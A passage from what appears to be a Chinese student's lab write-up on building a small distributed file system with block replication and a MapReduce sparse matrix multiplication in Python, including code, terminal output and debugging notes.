class="line">Request: new_fat_item test_rm/test_rm0.txt 8411</span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4096</span><br><span class="line">1,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4096</span><br><span class="line">2,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],219</span><br><span class="line"></span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -<span class="built_in">rm</span> test_rm/test_rm0.txt</span><br><span class="line">Request: rm_fat_item test_rm/test_rm0.txt</span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4096</span><br><span class="line">1,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4096</span><br><span class="line">2,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],219</span><br><span class="line"></span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk0 successfully~</span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk0 successfully~</span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk0 successfully~</span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk1 successfully~</span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk1 successfully~</span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk1 successfully~</span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk2 successfully~</span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk2 successfully~</span><br><span class="line">Remove chunk ./dfs/data/test_rm/test_rm0.txt.blk2 successfully~</span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ <span class="built_in">ls</span> dfs/data/test_rm/</span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ </span><br></pre></td></tr></table></figure><p><img src="/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/image-20231107115858615.png" alt></p><h2 id="data-replication">data replication</h2><p>目前common.py中DFS_REPLICATION为1，意为每个数据块只存储在一台主机上。实际上从系统稳定性考虑，每个数据块会被存放在多台主机。请修改DFS_REPLICATION和HOST_LIST，<a href="http://xn--namenode-vp1mg81b.py">以及namenode.py</a>、<a href="http://datanode.py">datanode.py</a>、client.py中对应的部分，实现多副本块存储。推荐dfs_replicatio=3 ，在5台机器上测试。</p><p>以上代码和运行结果已经使用了 <code>data replication</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python client.py -copyFromLocal ./test/test_copyToLocal.txt test_replication/0.txt</span><br></pre></td></tr></table></figure><p>如下图所示，通过vscode文本框可以看到thum01中有1和2块，通过tmux中左上分窗可以看到thumm03上有0和2号块……且其他节点上确实有对应块，且块中内容均正确。</p><p><img src="/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/image-20231105195832765.png" alt></p><h1 id="MapReduce-实现稀疏矩阵乘法">MapReduce 实现稀疏矩阵乘法</h1><h2 id="数据”断裂“问题">数据”断裂“问题</h2><p>在前面的程序中，client在上传文件时会向name_node发文件总大小，name_node再按照固定字节数的方式进行分块，这样带来了一个巨大的问题：<br>按照字节划分可以导致数据”断裂“问题，分块交接处的数据分块可能被分成2块。</p><p>由于name_node无法访问原文件，因此更改方法只能是client进行预分块，client保证每块大小尽可能接近<code>DFS_BLK_SIZE</code>且每个分块中数据都是完整的，并把各个分块的大小上传给name_node。</p><blockquote><p>但如果某个数据特别大，超过<code>DFS_BLK_SIZE</code>，那么上面的处理会导致没有该数据不能放进DFS（死循环）。<br>虽说设计分布式系统时应考虑所有的情况，但是这里还是偷个懒了（</p></blockquote><h2 id="client-计算分块大小">client 计算分块大小</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">preCalculateFileSize</span>(<span class="params">self, local_file</span>):</span><br><span class="line">    blk_size_list = []</span><br><span class="line">    cur_blk_size = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># 字节模式去读, 字符模式下len(™)=2, 但占4字节</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            <span class="keyword">if</span> (cur_blk_size + <span class="built_in">len</span>(line)) &gt; DFS_BLK_SIZE:</span><br><span class="line">                blk_size_list.append(cur_blk_size)</span><br><span class="line">                cur_blk_size = <span class="built_in">len</span>(line)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur_blk_size += <span class="built_in">len</span>(line)</span><br><span class="line">        <span class="keyword">if</span> cur_blk_size:</span><br><span class="line">            blk_size_list.append(cur_blk_size)</span><br><span class="line">    <span class="keyword">return</span> blk_size_list</span><br></pre></td></tr></table></figure><blockquote><p><strong>问题记录：按字节读取和按字符读取</strong></p><p>问题：<code>os.path.getsize</code> 和 按行读取字符这总数不相等。<br>注意：读取的每行line是包含行末换行符<code>\n</code>的，在<code>len()</code>时也会被计入长度，本人测试是占一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.getsize(<span class="string">&quot;test.txt&quot;</span>)</span><br><span class="line"><span class="number">8411</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line"><span class="meta">... </span>    s += <span class="built_in">len</span>(line)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="number">8399</span></span><br></pre></td></tr></table></figure><p>经过测试换行符<code>\n</code>和缩进、空格都不会引发长度计数的问题，那究竟是什么导致了长度不相等的问题呢？</p><p>原因在于<strong>非ASCII字符</strong>，比如<strong>™在len()时长度为2，而在字节模式中占4个字符</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1 = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2 = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls1 = f1.readlines()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls2 = f2.readlines()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ls1)):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> (<span class="built_in">len</span>(ls1[i]) != <span class="built_in">len</span>(ls2[i])):</span><br><span class="line"><span class="meta">... </span>        <span class="built_in">print</span>(<span class="string">f&quot;len(ls1[i]) = <span class="subst">&#123;<span class="built_in">len</span>(ls1[i])&#125;</span> len(ls2[i]) = <span class="subst">&#123;<span class="built_in">len</span>(ls2[i])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="meta">... </span>        <span class="built_in">print</span>(ls1[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>        <span class="built_in">print</span>(ls2[i])</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="built_in">len</span>(ls1[i]) = <span class="number">107</span> <span class="built_in">len</span>(ls2[i]) = <span class="number">109</span></span><br><span class="line">Although the Hadoop framework <span class="keyword">is</span> implemented <span class="keyword">in</span> Java™, MapReduce applications need <span class="keyword">not</span> be written <span class="keyword">in</span> Java.</span><br><span class="line"><span class="string">b&#x27;Although the Hadoop framework is implemented in Java\xe2\x84\xa2, MapReduce applications need not be written in Java.\n&#x27;</span></span><br><span class="line"><span class="built_in">len</span>(ls1[i]) = <span class="number">96</span> <span class="built_in">len</span>(ls2[i]) = <span class="number">98</span></span><br><span class="line">Hadoop Pipes <span class="keyword">is</span> a SWIG-compatible C++ API to implement MapReduce applications (non JNI™ based).</span><br><span class="line"><span class="string">b&#x27;Hadoop Pipes is a SWIG-compatible C++ API to implement MapReduce applications (non JNI\xe2\x84\xa2 based).\n&#x27;</span></span><br><span class="line"><span class="built_in">len</span>(ls1[i]) = <span class="number">94</span> <span class="built_in">len</span>(ls2[i]) = <span class="number">98</span></span><br><span class="line">Here, myarchive.<span class="built_in">zip</span> will be placed <span class="keyword">and</span> unzipped into a directory by the name “myarchive.<span class="built_in">zip</span>”.</span><br><span class="line"><span class="string">b&#x27;Here, myarchive.zip will be placed and unzipped into a directory by the name \xe2\x80\x9cmyarchive.zip\xe2\x80\x9d.\n&#x27;</span></span><br><span class="line"><span class="built_in">len</span>(ls1[i]) = <span class="number">219</span> <span class="built_in">len</span>(ls2[i]) = <span class="number">223</span></span><br><span class="line">Here, the files dir1/<span class="built_in">dict</span>.txt <span class="keyword">and</span> dir2/<span class="built_in">dict</span>.txt can be accessed by tasks using the symbolic names dict1 <span class="keyword">and</span> dict2 respectively. The archive mytar</span><br><span class="line">.tgz will be placed <span class="keyword">and</span> unarchived into a directory by the name “tgzdir”.</span><br><span class="line"><span class="string">b&#x27;Here, the files dir1/dict.txt and dir2/dict.txt can be accessed by tasks using the symbolic names dict1 and dict2 respectively. The archive myt</span></span><br><span class="line"><span class="string">ar.tgz will be placed and unarchived into a directory by the name \xe2\x80\x9ctgzdir\xe2\x80\x9d.\n</span></span><br></pre></td></tr></table></figure><p>总结：以后遇到这种操作都应该采用字节模式读取。</p></blockquote><h2 id="conn-helper-py：packet设计">conn_helper.py：packet设计</h2><p>如上一节，传输对象不限于字符串，还涉及到了列表等对象，此外由于发送方和接收方的缓冲区有限，有必要设计单独的通信工具函数。</p><p><a href="https://blog.csdn.net/qq_40418553/article/details/120674282">网上很多方法</a>在传输大文件时会遇到问题，会报错：<code>EOFError: Ran out of input</code>。如下图所示，发送方发送的数据长度是565550，接收方时而能接受到完整数据，比如右下方终端窗中上一次运行中恢复出了recv_data；时而失败，比如右下终端窗中这一次运行失败，只接收到了43776字节。</p><blockquote><p>比较神奇的是每次运行失败都是接受到固定字节数的数据，test_client.py中是43776字节，client.py中是14480字节，本人求助谷歌后没有获得有效的线索。<br>由于之前网络学的太基础了，不会分析TCP连接，以后好好学网络:)</p></blockquote><p><img src="/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/image-20231108102602237.png" alt></p><p>这里采取的解决方法是在使用json.dumps对object进行序列化后，在前面使用4字节的字段保存长度。</p><p>为了偷懒，程序中只用涉及传输列表、字典等高级对象时才使用 <code>send_obj</code> 和 <code>receive_obj</code>, 传输字符串部分的代码不改了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_msg</span>(<span class="params">conn, msg</span>):</span><br><span class="line">    conn.sendall(struct.pack(<span class="string">&#x27;I&#x27;</span>, <span class="built_in">len</span>(msg)) + msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_obj</span>(<span class="params">conn, msg</span>):</span><br><span class="line">    send_msg(conn, json.dumps(msg).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_msg</span>(<span class="params">conn</span>):</span><br><span class="line">    msg_len = struct.unpack(<span class="string">&#x27;I&#x27;</span>, conn.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">    ret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(ret) &lt; msg_len:</span><br><span class="line">        msg = conn.recv(msg_len - <span class="built_in">len</span>(ret))</span><br><span class="line">        <span class="keyword">if</span> msg <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        ret = ret + msg</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_obj</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="keyword">return</span> json.loads(receive_msg(conn).decode())</span><br></pre></td></tr></table></figure><h2 id="client-py-发布Map任务，执行Reduce任务"><a href="http://client.py">client.py</a> 发布Map任务，执行Reduce任务</h2><blockquote><p>MapReduce编程模型中Map和Reduce的抽象输入输出如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map(k1,v1) -&gt;list(k2,v2)</span><br><span class="line">reduce(k2,list(v2)) -&gt;list(v2)</span><br></pre></td></tr></table></figure></blockquote><p>client 在 MapReduce 函数中实现发布Map任务，执行Reduce任务的功能，可分为以下几步</p><ol><li>CopyFromLocal<br>需要在client处预计算各分块大小，并上传给 name_node 得到FAT表</li><li>分配Map任务, DataNode作为Mapper生成list(k: v)并返回<br>但这里Data返回的其实直接是 k : list(v)，每个v是通过一个list存储如[‘a’,  j, val]</li><li>执行Reduce<br>client只要把来自各个data_node的 k : list(v) 合并，即把相同key的值组合到一起，就能开始执行Reduce，因此出于简便考虑，不分发Reduce任务而在client处执行Reduce即可。</li><li>整理得到输出<br>任务要求按照key1 = i, key2 = j的数值序排序输出。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">MapReduce</span>(<span class="params">self, m, p, n, input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># 1. CopyFromLocal</span></span><br><span class="line">    blk_size_list = self.preCalculateFileSize(input_file)</span><br><span class="line">    request = <span class="string">&quot;new_fat_item &#123;&#125; &quot;</span>.<span class="built_in">format</span>(input_file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(request))</span><br><span class="line">    <span class="comment"># 从NameNode获取一张FAT表</span></span><br><span class="line">    self.name_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    send_obj(self.name_node_sock, blk_size_list)</span><br><span class="line">    fat_pd = self.name_node_sock.recv(BUF_SIZE)</span><br><span class="line">    <span class="comment"># 打印FAT表，并使用pandas读取</span></span><br><span class="line">    fat_pd = <span class="built_in">str</span>(fat_pd, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fat: \n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(fat_pd))</span><br><span class="line">    fat = pd.read_csv(StringIO(fat_pd))</span><br><span class="line">    <span class="comment"># 根据FAT表逐个向目标DataNode发送数据块</span></span><br><span class="line">    fp = <span class="built_in">open</span>(input_file)</span><br><span class="line">    <span class="keyword">for</span> idx, row <span class="keyword">in</span> fat.iterrows():</span><br><span class="line">        data = fp.read(<span class="built_in">int</span>(row[<span class="string">&#x27;blk_size&#x27;</span>]))</span><br><span class="line">        datanode_hosts = re.findall(<span class="string">r&quot;&#x27;(.+?)&#x27;&quot;</span>, row[<span class="string">&#x27;host_name&#x27;</span>])  <span class="comment"># 正则表达式</span></span><br><span class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> datanode_hosts:</span><br><span class="line">            data_node_sock = socket.socket()</span><br><span class="line">            data_node_sock.connect((host, DATA_NODE_PORT))</span><br><span class="line">            blk_path = input_file + <span class="string">&quot;.blk&#123;&#125;&quot;</span>.<span class="built_in">format</span>(row[<span class="string">&#x27;blk_no&#x27;</span>])</span><br><span class="line">            request = <span class="string">&quot;store &#123;&#125;&quot;</span>.<span class="built_in">format</span>(blk_path)</span><br><span class="line">            data_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            time.sleep(<span class="number">0.2</span>)  <span class="comment"># 两次传输需要间隔一段时间，避免粘包</span></span><br><span class="line">            data_node_sock.send(<span class="built_in">bytes</span>(data, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            data_node_sock.close()</span><br><span class="line">    fp.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finish CopyFromLocal&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 分配Map任务, DataNode作为Mapper生成list(k: v)，但返回的其实直接是 k:list(v)</span></span><br><span class="line">    <span class="comment"># 根据FAT表分配Map任务</span></span><br><span class="line">    key_valuelist = <span class="built_in">dict</span>()</span><br><span class="line">    fat = pd.read_csv(StringIO(fat_pd))</span><br><span class="line">    <span class="keyword">for</span> idx, row <span class="keyword">in</span> fat.iterrows():</span><br><span class="line">        datanode_hosts = re.findall(<span class="string">r&quot;&#x27;(.+?)&#x27;&quot;</span>, row[<span class="string">&#x27;host_name&#x27;</span>])</span><br><span class="line">        data_node_sock = socket.socket()</span><br><span class="line">        data_node_sock.connect((datanode_hosts[<span class="number">0</span>], DATA_NODE_PORT))</span><br><span class="line">        blk_path = input_file + <span class="string">&quot;.blk&#123;&#125;&quot;</span>.<span class="built_in">format</span>(row[<span class="string">&#x27;blk_no&#x27;</span>])</span><br><span class="line">        request = <span class="string">&quot;map &#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(blk_path, m, n)</span><br><span class="line">        data_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        key_values = receive_obj(data_node_sock)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> key_values.keys():</span><br><span class="line">            <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> key_valuelist.keys():</span><br><span class="line">                key_valuelist[k] = key_values[k]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                key_valuelist[k] += key_values[k]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finish Reduce&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 执行Reduce</span></span><br><span class="line">    ij_matrix = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> key, valuelist <span class="keyword">in</span> key_valuelist.items():</span><br><span class="line">        a_idx_val = &#123;&#125;</span><br><span class="line">        b_idx_val = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> mat_idx_val <span class="keyword">in</span> valuelist:</span><br><span class="line">            mat, idx, val = mat_idx_val[<span class="number">0</span>], mat_idx_val[<span class="number">1</span>], mat_idx_val[<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">if</span> (mat == <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">                a_idx_val[idx] = val</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                b_idx_val[idx] = val</span><br><span class="line">        res_element_val = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> a_idx_val.keys():</span><br><span class="line">            <span class="keyword">if</span> idx <span class="keyword">in</span> b_idx_val.keys():</span><br><span class="line">                res_element_val += a_idx_val[idx] * b_idx_val[idx]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res_element_val != <span class="number">0</span>: </span><br><span class="line">            ij_matrix[key] = res_element_val</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 整理得到输出</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> of:</span><br><span class="line">        <span class="comment"># 按照key1=i, key2=j的数值序进行排序</span></span><br><span class="line">        <span class="keyword">for</span> ij <span class="keyword">in</span> <span class="built_in">sorted</span>(ij_matrix, key=<span class="keyword">lambda</span> ij: [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ij.split(<span class="string">&#x27;,&#x27;</span>)]):</span><br><span class="line">            of.write(<span class="string">&quot;&#123;&#125;,&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(ij, ij_matrix[ij]))   </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finish writing to output file.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><ol><li><p>将来自不同Mapper的 k : list(v) 合并时，合并的是list，使用的是 +=。</p></li><li><p>按键数值排序规则可以这样写：<code>for ij in sorted(ij_matrix, key=lambda ij: [int(x) for x in ij.split(',')])</code>。</p></li></ol></blockquote><h2 id="data-node-py中map函数">data_node.py中map函数</h2><p>dict 不支持相同key不同value的数据，由于我们的最终的目的是要得到 k : list(v)，这里干脆不先生成list(k : v)，直接生成 k : list(v) 好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">map</span>(<span class="params">self, dfs_path, m, n</span>):</span><br><span class="line">    local_path = os.path.join(DATA_NODE_DIR, dfs_path)</span><br><span class="line">    key_valuelist = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(local_path):</span><br><span class="line">        line_4parts = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        mat, i, j, val = line_4parts[<span class="number">0</span>], <span class="built_in">int</span>(line_4parts[<span class="number">1</span>]), <span class="built_in">int</span>(line_4parts[<span class="number">2</span>]), <span class="built_in">int</span>(line_4parts[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">if</span> mat == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">                str_i_k = <span class="string">&quot;&#123;&#125;,&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, k)</span><br><span class="line">                <span class="keyword">if</span> str_i_k <span class="keyword">not</span> <span class="keyword">in</span> key_valuelist.keys():</span><br><span class="line">                    key_valuelist[str_i_k] = [[<span class="string">&#x27;a&#x27;</span>, j, val]]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    key_valuelist[str_i_k].append([<span class="string">&#x27;a&#x27;</span>, j, val])</span><br><span class="line">        <span class="keyword">elif</span> mat == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m + <span class="number">1</span>):</span><br><span class="line">                str_k_j = <span class="string">&quot;&#123;&#125;,&#123;&#125;&quot;</span>.<span class="built_in">format</span>(k, j)</span><br><span class="line">                <span class="keyword">if</span> str_k_j <span class="keyword">not</span> <span class="keyword">in</span> key_valuelist.keys():</span><br><span class="line">                    key_valuelist[str_k_j] = [[<span class="string">&#x27;b&#x27;</span>, i, val]]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    key_valuelist[str_k_j].append([<span class="string">&#x27;b&#x27;</span>, i, val])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_valuelist</span><br></pre></td></tr></table></figure><blockquote><ol><li>list 类型的<code>[i, k]</code>不可哈希，可以将其格式化成字符串作为key。</li><li>生成k : list(v) 时，当遇到相同k时，将v纳入结果list时使用的操作是append。</li></ol></blockquote><h2 id="测试验证">测试验证</h2><h3 id="Example上的验证">Example上的验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -MapReduce <span class="built_in">test</span>/input_4_3_2_.txt <span class="built_in">test</span>/output_4_3_2_.txt</span><br><span class="line">4 <span class="built_in">test</span>/output_4_3_2_.txt</span><br><span class="line">Request: new_fat_item <span class="built_in">test</span>/input_4_3_2_.txt </span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],133</span><br><span class="line"></span><br><span class="line">Finish CopyFromLocal</span><br><span class="line">Finish Reduce</span><br><span class="line">Finish writing to output 